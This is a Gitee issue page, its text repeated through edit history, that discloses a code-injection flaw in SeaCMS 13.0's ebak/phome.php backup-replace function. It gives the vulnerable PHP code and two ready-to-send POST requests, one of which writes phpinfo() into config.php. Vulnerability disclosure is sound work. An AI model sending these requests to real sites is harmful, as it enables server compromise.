![输入图片说明](https://foruda.gitee.com/images/1733214736027735409/ec9d6435\_14685008.png "屏幕截图")

The content is

![输入图片说明](https://foruda.gitee.com/images/1733214740329341193/8fc6a522\_14685008.png "屏幕截图")

Content of Config.php

![输入图片说明](https://foruda.gitee.com/images/1733214748185088845/462a273e\_14685008.png "屏幕截图")

At this point, the vulnerability exploitation principle I am submitting is to change the content of this backup data.

Attack example:

Currently, I will first back up the data from a database table.

![输入图片说明](https://foruda.gitee.com/images/1733214784828461480/9d6076a7\_14685008.png "屏幕截图")

POST /z5fskt/ebak/phomebak.php HTTP/1.1

Host: seacms

Content-Length: 250

Cache-Control: max-age=0

Upgrade-Insecure-Requests: 1

Origin: http://seacms

Content-Type: application/x-www-form-urlencoded

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3;q=0.7

Referer: http://seacms/z5fskt/ebak/ChangeTable.php?mydbname=seacms&keyboard=sea&act=b

Accept-Encoding: gzip, deflate, br

Accept-Language: zh-CN,zh;q=0.9

Cookie: PHPSESSID=4qqjagpiagq24ekmdl76fljqac

Connection: close

phome=DoEbak&mydbname=seacms&baktype=0&filesize=1024&bakline=1000&autoauf=1&bakstru=1&dbchar=utf8&bakdatatype=1&mypath=test&insertf=replace&waitbaktime=0&readme=&tablename%5B%5D=sea\_co\_cls&Submit=%E5%BC%80%E5%A7%8B%E5%A4%87%E4%BB%BD

The folder is test, and the backup table is sea\_co\_cls

![输入图片说明](https://foruda.gitee.com/images/1733214794391022310/1f67e4eb\_14685008.png "屏幕截图")

![输入图片说明](https://foruda.gitee.com/images/1733214800268427696/19747808\_14685008.png "屏幕截图")

此时访问phome.php，构造攻击语句

![输入图片说明](https://foruda.gitee.com/images/1733214805643331759/5dd05690\_14685008.png "屏幕截图")

POST /z5fskt/ebak/phome.php?phome=RepPathFiletext HTTP/1.1

Host: seacms

Content-Length: 55

Cache-Control: max-age=0

Upgrade-Insecure-Requests: 1

Origin: http://seacms

Content-Type: application/x-www-form-urlencoded

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3;q=0.7

Referer: http://seacms/z5fskt/ebak/ReData.php

Accept-Encoding: gzip, deflate, br

Accept-Language: zh-CN,zh;q=0.9

Cookie: PHPSESSID=4qqjagpiagq24ekmdl76fljqac

Connection: close

mypath=test&oldword=sea\_co\_cls&newword=phpinfo()&dozz=1

模拟攻击后

此时的config.php

![输入图片说明](https://foruda.gitee.com/images/1733214817915291716/d7712142\_14685008.png "屏幕截图")

![输入图片说明](https://foruda.gitee.com/images/1733214827215348456/4e642c75\_14685008.png "屏幕截图")

此漏洞与CVE-2024-40522很相似，但不同，攻击逻辑相似，因为都是更改文件内容，但漏洞存在的文件是不同的，存在的函数也是不同的

修复建议：对传入可控的参数进行过滤

New content
Seacms

Version: 13.0

Vulnerable Component:

In the backend path \ebak\phome.php

![输入图片说明](https://foruda.gitee.com/images/1733214654043619177/8983a414\_14685008.png "屏幕截图")

this function：Ebak\_RepPathFiletext（）

follow-up function：

function Ebak\_RepPathFiletext($add){

global $bakpath;

$mypath=trim($add['mypath']);

$oldword=Ebak\_ClearAddsData($add['oldword']);

$newword=Ebak\_ClearAddsData($add['newword']);

$dozz=(int)$add['dozz'];

if(empty($oldword)||empty($mypath))

{

printerror("EmptyRepPathFiletext","history.go(-1)");

}

if(strstr($mypath,".."))

{

printerror("NotChangeRepPathFiletext","history.go(-1)");

}

$path=$bakpath."/".$mypath; //bdata/seacms1

if(!file\_exists($path))

{

printerror("PathNotExists","history.go(-1)");

}

$hand=@opendir($path);

while($file=@readdir($hand))

{

$filename=$path."/".$file;

if($file!="."&&$file!=".."&&is\_file($filename))

{

$value=ReadFiletext($filename);

if($dozz)

{

$newvalue=Ebak\_DoRepFiletextZz($oldword,$newword,$value);

}

else

{

if(!stristr($value,$oldword))

{

continue;

}

$newvalue=str\_replace($oldword,$newword,$value);

}

WriteFiletext\_n($filename,$newvalue);

}

}

printerror("RepPathFiletextSuccess","RepFiletext.php");

}

Three parameters are passed here

![输入图片说明](https://foruda.gitee.com/images/1733214668082174999/9a5ac0b2\_14685008.png "屏幕截图")

Will eventually be called

![输入图片说明](https://foruda.gitee.com/images/1733214672307364450/3aa72144\_14685008.png "屏幕截图")

![输入图片说明](https://foruda.gitee.com/images/1733214680896695542/26ee94ef\_14685008.png "屏幕截图")

![输入图片说明](https://foruda.gitee.com/images/1733214692609977827/a3f7c456\_14685008.png "屏幕截图")

The meaning of the words in the picture is：Here, $filename is the $file under the $path, where $path is a variable for bakpath under mypath. Since mypath is controllable, $path is controllable as well. At this point, $hand is also controllable.

Furthermore, since $file is $hand, $file is controllable here as well file($filename)

In the first few lines

![输入图片说明](https://foruda.gitee.com/images/1733214696873068952/04495c3f\_14685008.png "屏幕截图")

The $bakpath is hardcoded here, and there are filters for ../ and ./, so only files under the $bakpath directory can be controlled.

![输入图片说明](https://foruda.gitee.com/images/1733214703783526536/f32a4e9f\_14685008.png "屏幕截图")

This only applies regular expression matching control to $newvalue, and since the target value is controllable, therefore here...

We can control the WriteFiletext\_n function. The data packet is constructed because this overall process involves changing the content of the file generated after a data backup.

![输入图片说明](https://foruda.gitee.com/images/1733214712988141552/290b1a23\_14685008.png "屏幕截图")

Therefore, it is necessary to back up here first. Clicking on the backup will display the name of the database, the name of the backup folder, and the table names chosen for backing up the data.

![输入图片说明](https://foruda.gitee.com/images/1733214720504488341/bccd1209\_14685008.png "屏幕截图")

A folder will be created after the backup.

![输入图片说明](https://foruda.gitee.com/images/1733214736027735409/ec9d6435\_14685008.png "屏幕截图")

The content is

![输入图片说明](https://foruda.gitee.com/images/1733214740329341193/8fc6a522\_14685008.png "屏幕截图")

Content of Config.php

![输入图片说明](https://foruda.gitee.com/images/1733214748185088845/462a273e\_14685008.png "屏幕截图")

At this point, the vulnerability exploitation principle I am submitting is to change the content of this backup data.

Attack example:

Currently, I will first back up the data from a database table.

![输入图片说明](https://foruda.gitee.com/images/1733214784828461480/9d6076a7\_14685008.png "屏幕截图")

POST /z5fskt/ebak/phomebak.php HTTP/1.1

Host: seacms

Content-Length: 250

Cache-Control: max-age=0

Upgrade-Insecure-Requests: 1

Origin: http://seacms

Content-Type: application/x-www-form-urlencoded

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3;q=0.7

Referer: http://seacms/z5fskt/ebak/ChangeTable.php?mydbname=seacms&keyboard=sea&act=b

Accept-Encoding: gzip, deflate, br

Accept-Language: zh-CN,zh;q=0.9

Cookie: PHPSESSID=4qqjagpiagq24ekmdl76fljqac

Connection: close

phome=DoEbak&mydbname=seacms&baktype=0&filesize=1024&bakline=1000&autoauf=1&bakstru=1&dbchar=utf8&bakdatatype=1&mypath=test&insertf=replace&waitbaktime=0&readme=&tablename%5B%5D=sea\_co\_cls&Submit=%E5%BC%80%E5%A7%8B%E5%A4%87%E4%BB%BD

The folder is test, and the backup table is sea\_co\_cls

![输入图片说明](https://foruda.gitee.com/images/1733214794391022310/1f67e4eb\_14685008.png "屏幕截图")

![输入图片说明](https://foruda.gitee.com/images/1733214800268427696/19747808\_14685008.png "屏幕截图")

此时访问phome.php，构造攻击语句

![输入图片说明](https://foruda.gitee.com/images/1733214805643331759/5dd05690\_14685008.png "屏幕截图")

POST /z5fskt/ebak/phome.php?phome=RepPathFiletext HTTP/1.1

Host: seacms

Content-Length: 55

Cache-Control: max-age=0

Upgrade-Insecure-Requests: 1

Origin: http://seacms

Content-Type: application/x-www-form-urlencoded

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3;q=0.7

Referer: http://seacms/z5fskt/ebak/ReData.php

Accept-Encoding: gzip, deflate, br

Accept-Language: zh-CN,zh;q=0.9

Cookie: PHPSESSID=4qqjagpiagq24ekmdl76fljqac

Connection: close

mypath=test&oldword=sea\_co\_cls&newword=phpinfo()&dozz=1

模拟攻击后

此时的config.php

![输入图片说明](https://foruda.gitee.com/images/1733214817915291716/d7712142\_14685008.png "屏幕截图")

![输入图片说明](https://foruda.gitee.com/images/1733214827215348456/4e642c75\_14685008.png "屏幕截图")

此漏洞与CVE-2024-40522很相似，但不同，攻击逻辑相似，因为都是更改文件内容，但漏洞存在的文件是不同的，存在的函数也是不同的

修复建议：对传入可控的参数进行过滤

[![]()](/FengFu01 "FengFu01")
[fufufu](/FengFu01 "FengFu01") changed **description**

Original content
Seacms

Version: 13.0

Vulnerable Component:

In the backend path \ebak\phome.php

![输入图片说明](https://foruda.gitee.com/images/1733214654043619177/8983a414\_14685008.png "屏幕截图")

this function：Ebak\_RepPathFiletext（）

follow-up function：

function Ebak\_RepPathFiletext($add){

global $bakpath;

$mypath=trim($add['mypath']);

$oldword=Ebak\_ClearAddsData($add['oldword']);

$newword=Ebak\_ClearAddsData($add['newword']);

$dozz=(int)$add['dozz'];

if(empty($oldword)||empty($mypath))

{

printerror("EmptyRepPathFiletext","history.go(-1)");

}

if(strstr($mypath,".."))

{

printerror("NotChangeRepPathFiletext","history.go(-1)");

}

$path=$bakpath."/".$mypath; //bdata/seacms1

if(!file\_exists($path))

{

printerror("PathNotExists","history.go(-1)");

}

$hand=@opendir($path);

while($file=@readdir($hand))

{

$filename=$path."/".$file;

if($file!="."&&$file!=".."&&is\_file($filename))

{

$value=ReadFiletext($filename);

if($dozz)

{

$newvalue=Ebak\_DoRepFiletextZz($oldword,$newword,$value);

}

else

{

if(!stristr($value,$oldword))

{

continue;

}

$newvalue=str\_replace($oldword,$newword,$value);

}

WriteFiletext\_n($filename,$newvalue);

}

}

printerror("RepPathFiletextSuccess","RepFiletext.php");

}

Three parameters are passed here

![输入图片说明](https://foruda.gitee.com/images/1733214668082174999/9a5ac0b2\_14685008.png "屏幕截图")

Will eventually be called

![输入图片说明](https://foruda.gitee.com/images/1733214672307364450/3aa72144\_14685008.png "屏幕截图")

![输入图片说明](https://foruda.gitee.com/images/1733214680896695542/26ee94ef\_14685008.png "屏幕截图")

![输入图片说明](https://foruda.gitee.com/images/1733214692609977827/a3f7c456\_14685008.png "屏幕截图")

The meaning of the words in the picture is：Here, $filename is the $file under the $path, where $path is a variable for bakpath under mypath. Since mypath is controllable, $path is controllable as well. At this point, $hand is also controllable.

Furthermore, since $file is $hand, $file is controllable here as well file($filename)

In the first few lines

![输入图片说明](https://foruda.gitee.com/images/1733214696873068952/04495c3f\_14685008.png "屏幕截图")

The $bakpath is hardcoded here, and there are filters for ../ and ./, so only files under the $bakpath directory can be controlled.

![输入图片说明](https://foruda.gitee.com/images/1733214703783526536/f32a4e9f\_14685008.png "屏幕截图")

This only applies regular expression matching control to $newvalue, and since the target value is controllable, therefore here...

We can control the WriteFiletext\_n function. The data packet is constructed because this overall process involves changing the content of the file generated after a data backup.

![输入图片说明](https://foruda.gitee.com/images/1733214712988141552/290b1a23\_14685008.png "屏幕截图")

Therefore, it is necessary to back up here first. Clicking on the backup will display the name of the database, the name of the backup folder, and the table names chosen for backing up the data.

![输入图片说明](https://foruda.gitee.com/images/1733214720504488341/bccd1209\_14685008.png "屏幕截图")

A folder will be created after the backup.

![输入图片说明](https://foruda.gitee.com/images/1733214736027735409/ec9d6435\_14685008.png "屏幕截图")

The content is

![输入图片说明](https://foruda.gitee.com/images/1733214740329341193/8fc6a522\_14685008.png "屏幕截图")

Content of Config.php

![输入图片说明](https://foruda.gitee.com/images/1733214748185088845/462a273e\_14685008.png "屏幕截图")

At this point, the vulnerability exploitation principle I am submitting is to change the content of this backup data.

Attack example:

Currently, I will first back up the data from a database table.

![输入图片说明](https://foruda.gitee.com/images/1733214784828461480/9d6076a7\_14685008.png "屏幕截图")

POST /z5fskt/ebak/phomebak.php HTTP/1.1

Host: seacms

Content-Length: 250

Cache-Control: max-age=0

Upgrade-Insecure-Requests: 1

Origin: http://seacms

Content-Type: application/x-www-form-urlencoded

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3;q=0.7

Referer: http://seacms/z5fskt/ebak/ChangeTable.php?mydbname=seacms&keyboard=sea&act=b

Accept-Encoding: gzip, deflate, br

Accept-Language: zh-CN,zh;q=0.9

Cookie: PHPSESSID=4qqjagpiagq24ekmdl76fljqac

Connection: close

phome=DoEbak&mydbname=seacms&baktype=0&filesize=1024&bakline=1000&autoauf=1&bakstru=1&dbchar=utf8&bakdatatype=1&mypath=test&insertf=replace&waitbaktime=0&readme=&tablename%5B%5D=sea\_co\_cls&Submit=%E5%BC%80%E5%A7%8B%E5%A4%87%E4%BB%BD

The folder is test, and the backup table is sea\_co\_cls

![输入图片说明](https://foruda.gitee.com/images/1733214794391022310/1f67e4eb\_14685008.png "屏幕截图")

![输入图片说明](https://foruda.gitee.com/images/1733214800268427696/19747808\_14685008.png "屏幕截图")

此时访问phome.php，构造攻击语句

![输入图片说明](https://foruda.gitee.com/images/1733214805643331759/5dd05690\_14685008.png "屏幕截图")

POST /z5fskt/ebak/phome.php?phome=RepPathFiletext HTTP/1.1

Host: seacms

Content-Length: 55

Cache-Control: max-age=0

Upgrade-Insecure-Requests: 1

Origin: http://seacms

Content-Type: application/x-www-form-urlencoded

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3;q=0.7

Referer: http://seacms/z5fskt/ebak/ReData.php

Accept-Encoding: gzip, deflate, br

Accept-Language: zh-CN,zh;q=0.9

Cookie: PHPSESSID=4qqjagpiagq24ekmdl76fljqac

Connection: close

mypath=test&oldword=sea\_co\_cls&newword=phpinfo()&dozz=1

模拟攻击后

此时的config.php

![输入图片说明](https://foruda.gitee.com/images/1733214817915291716/d7712142\_14685008.png "屏幕截图")

![输入图片说明](https://foruda.gitee.com/images/1733214827215348456/4e642c75\_14685008.png "屏幕截图")

此漏洞与CVE-2024-40522很相似，但不同，攻击逻辑相似，因为都是更改文件内容，但漏洞存在的文件是不同的，存在的函数也是不同的

修复建议：对传入可控的参数进行过滤

New content
Seacms

Version: 13.0

Vulnerable Component:

In the backend path \ebak\phome.php

![输入图片说明](https://foruda.gitee.com/images/1733214654043619177/8983a414\_14685008.png "屏幕截图")

this function：Ebak\_RepPathFiletext（）

follow-up function：

function Ebak\_RepPathFiletext($add){

global $bakpath;

$mypath=trim($add['mypath']);

$oldword=Ebak\_ClearAddsData($add['oldword']);

$newword=Ebak\_ClearAddsData($add['newword']);

$dozz=(int)$add['dozz'];

if(empty($oldword)||empty($mypath))

{

printerror("EmptyRepPathFiletext","history.go(-1)");

}

if(strstr($mypath,".."))

{

printerror("NotChangeRepPathFiletext","history.go(-1)");

}

$path=$bakpath."/".$mypath; //bdata/seacms1

if(!file\_exists($path))

{

printerror("PathNotExists","history.go(-1)");

}

$hand=@opendir($path);

while($file=@readdir($hand))

{

$filename=$path."/".$file;

if($file!="."&&$file!=".."&&is\_file($filename))

{

$value=ReadFiletext($filename);

if($dozz)

{

$newvalue=Ebak\_DoRepFiletextZz($oldword,$newword,$value);

}

else

{

if(!stristr($value,$oldword))

{

continue;

}

$newvalue=str\_replace($oldword,$newword,$value);

}

WriteFiletext\_n($filename,$newvalue);

}

}

printerror("RepPathFiletextSuccess","RepFiletext.php");

}

Three parameters are passed here

![输入图片说明](https://foruda.gitee.com/images/1733214668082174999/9a5ac0b2\_14685008.png "屏幕截图")

Will eventually be called

![输入图片说明](https://foruda.gitee.com/images/1733214672307364450/3aa72144\_14685008.png "屏幕截图")

![输入图片说明](https://foruda.gitee.com/images/1733214680896695542/26ee94ef\_14685008.png "屏幕截图")

![输入图片说明](https://foruda.gitee.com/images/1733214692609977827/a3f7c456\_14685008.png "屏幕截图")

The meaning of the words in the picture is：Here, $filename is the $file under the $path, where $path is a variable for bakpath under mypath. Since mypath is controllable, $path is controllable as well. At this point, $hand is also controllable.

Furthermore, since $file is $hand, $file is controllable here as well file($filename)

In the first few lines

![输入图片说明](https://foruda.gitee.com/images/1733214696873068952/04495c3f\_14685008.png "屏幕截图")

The $bakpath is hardcoded here, and there are filters for ../ and ./, so only files under the $bakpath directory can be controlled.

![输入图片说明](https://foruda.gitee.com/images/1733214703783526536/f32a4e9f\_14685008.png "屏幕截图")

This only applies regular expression matching control to $newvalue, and since the target value is controllable, therefore here...

We can control the WriteFiletext\_n function. The data packet is constructed because this overall process involves changing the content of the file generated after a data backup.

![输入图片说明](https://foruda.gitee.com/images/1733214712988141552/290b1a23\_14685008.png "屏幕截图")

Therefore, it is necessary to back up here first. Clicking on the backup will display the name of the database, the name of the backup folder, and the table names chosen for backing up the data.

![输入图片说明](https://foruda.gitee.com/images/1733214720504488341/bccd1209\_14685008.png "屏幕截图")

A folder will be created after the backup.

![输入图片说明](https://foruda.gitee.com/images/1733214736027735409/ec9d6435\_14685008.png "屏幕截图")

The content is

![输入图片说明](https://foruda.gitee.com/images/1733214740329341193/8fc6a522\_14685008.png "屏幕截图")

Content of Config.php

![输入图片说明](https://foruda.gitee.com/images/1733214748185088845/462a273e\_14685008.png "屏幕截图")

At this point, the vulnerability exploitation principle I am submitting is to change the content of this backup data.

Attack example:

Currently, I will first back up the data from a database table.

![输入图片说明](https://foruda.gitee.com/images/1733214784828461480/9d6076a7\_14685008.png "屏幕截图")

POST /z5fskt/ebak/phomebak.php HTTP/1.1

Host: seacms

Content-Length: 250

Cache-Control: max-age=0

Upgrade-Insecure-Requests: 1

Origin: http://seacms

Content-Type: application/x-www-form-urlencoded

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3;q=0.7

Referer: http://seacms/z5fskt/ebak/ChangeTable.php?mydbname=seacms&keyboard=sea&act=b

Accept-Encoding: gzip, deflate, br

Accept-Language: zh-CN,zh;q=0.9

Cookie: PHPSESSID=4qqjagpiagq24ekmdl76fljqac

Connection: close

phome=DoEbak&mydbname=seacms&baktype=0&filesize=1024&bakline=1000&autoauf=1&bakstru=1&dbchar=utf8&bakdatatype=1&mypath=test&insertf=replace&waitbaktime=0&readme=&tablename%5B%5D=sea\_co\_cls&Submit=%E5%BC%80%E5%A7%8B%E5%A4%87%E4%BB%BD

The folder is test, and the backup table is sea\_co\_cls

![输入图片说明](https://foruda.gitee.com/images/1733214794391022310/1f67e4eb\_14685008.png "屏幕截图")

![输入图片说明](https://foruda.gitee.com/images/1733214800268427696/19747808\_14685008.png "屏幕截图")

此时访问phome.php，构造攻击语句

![输入图片说明](https://foruda.gitee.com/images/1733214805643331759/5dd05690\_14685008.png "屏幕截图")

POST /z5fskt/ebak/phome.php?phome=RepPathFiletext HTTP/1.1

Host: seacms

Content-Length: 55

Cache-Control: max-age=0

Upgrade-Insecure-Requests: 1

Origin: http://seacms

Content-Type: application/x-www-form-urlencoded

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3;q=0.7

Referer: http://seacms/z5fskt/ebak/ReData.php

Accept-Encoding: gzip, deflate, br

Accept-Language: zh-CN,zh;q=0.9

Cookie: PHPSESSID=4qqjagpiagq24ekmdl76fljqac

Connection: close

mypath=test&oldword=sea\_co\_cls&newword=phpinfo()&dozz=1

After simulating the attack, the current config.php is

![输入图片说明](https://foruda.gitee.com/images/1733214817915291716/d7712142\_14685008.png "屏幕截图")

![输入图片说明](https://foruda.gitee.com/images/1733214827215348456/4e642c75\_14685008.png "屏幕截图")

This vulnerability is similar to CVE-2024-40522, but they are different. The attack logic is similar because both involve changing file content, but the files where the vulnerabilities exist are different, as are the functions involved.

Fix Recommendation: Filter the controllable parameters and encrypt the data packets.

Expand operation logs

Collapse operation logs

[Sign in](/login)
to comment

Status

Backlog

Backlog

Doing

Done

Closed

Assignees

Not set

Labels

Not set

[Label settings](/FengFu01/sea/labels)

Milestones
No related milestones

No related milestones

Pull Requests
None yet

None yet

Successfully merging a pull request will close this issue.

Planed to start   -   Planed to end

-

Top level

Not Top

Top Level: High

Top Level: Medium

Top Level: Low

Priority

Not specified

Serious

Main

Secondary

Unimportant

参与者（1）
[![]()](/FengFu01)

1
https://gitee.com/FengFu01/sea.git
git@gitee.com:FengFu01/sea.git
FengFu01
sea
sea

[![Gitee — A Git-based Code Hosting and Research Collaboration Platform](/static/images/logo-black.svg?t=158106666)](https://gitee.com)
©OSCHINA. All rights reserved

[Git Resources](/all-about-git)

[Learning Git](https://help.gitee.com/learn-Git-Branching/)

[CopyCat](https://copycat.gitee.com/)

[Downloads](/appclient)

[Gitee Reward](/gitee_reward)

[Gitee Stars](/gitee-stars)

[Featured Projects](/gvp)

[Blog](https://blog.gitee.com/)

[Nonprofit](/enterprises#nonprofit-plan)

[Gitee Go](https://gitee.com/features/gitee-go)

[OpenAPI](/api/v5/swagger)

[Help Center](https://help.gitee.com)

[Self-services](/self_services)

[Updates](/help/articles/4378)

[About Us](/about_us)

[Join us](https://www.oschina.net/news/131099/oschina-hiring)

[Terms of use](/terms)

[Feedback](/oschina/git-osc/issues)

[Partners](/links.html)

![Exchange](https://cn-assets.gitee.com/assets/contact_qr-5e2c2a8da453396590e56a545bce4974.jpg)

Exchange

![微信服务号](https://cn-assets.gitee.com/assets/qrcode-weixin@2x-b74cc97a2ea80123ea53a737f709836d.png)

WeChat

client#oschina.cn
Enterprise:400-606-0201

Pro：
13670252304

13352947997

![开放原子开源基金会](https://cn-assets.gitee.com/assets/logo-openatom-d083391cc8a54e283529f3fc11cc38ca.svg)
[OpenAtom Foundation](https://www.openatom.org/)
Cooperative code hosting platform

![违法和不良信息举报中心](https://cn-assets.gitee.com/assets/12377@2x-1aa42ed2d2256f82a61ecf57be1ec244.png)
[违法和不良信息举报中心](https://12377.cn)

[粤ICP备12009483号](http://beian.miit.gov.cn/)

[简 体](/language/zh-CN)
/
[繁 體](/language/zh-TW)
/
[English](/language/en)

Going to Help Center
### Search

[Git 命令在线学习](https://oschina.gitee.io/learn-git-branching/?utm_source==gitee-help-widget "Git 命令在线学习")[如何在 Gitee 导入 GitHub 仓库](https://gitee.com/help/articles/4261?utm_source==gitee-help-widget "如何在 Gitee 导入 GitHub 仓库")
[Git 仓库基础操作](/help/articles/4114)

[企业版和社区版功能对比](/help/articles/4166)

[SSH 公钥设置](/help/articles/4191)

[如何处理代码冲突](/help/articles/4194)

[仓库体积过大，如何减小？](/help/articles/4232)

[如何找回被删除的仓库数据](/help/articles/4279)

[Gitee 产品配额说明](/help/articles/4283)

[GitHub仓库快速导入Gitee及同步更新](/help/articles/4284)

[什么是 Release（发行版）](/help/articles/4328)

[将 PHP 项目自动发布到 packagist.org](/help/articles/4354)

Comment

Repository Report

Back to the top

Login prompt

This operation requires login to the code cloud account. Please log in before operating.

Go to login

No account. Register


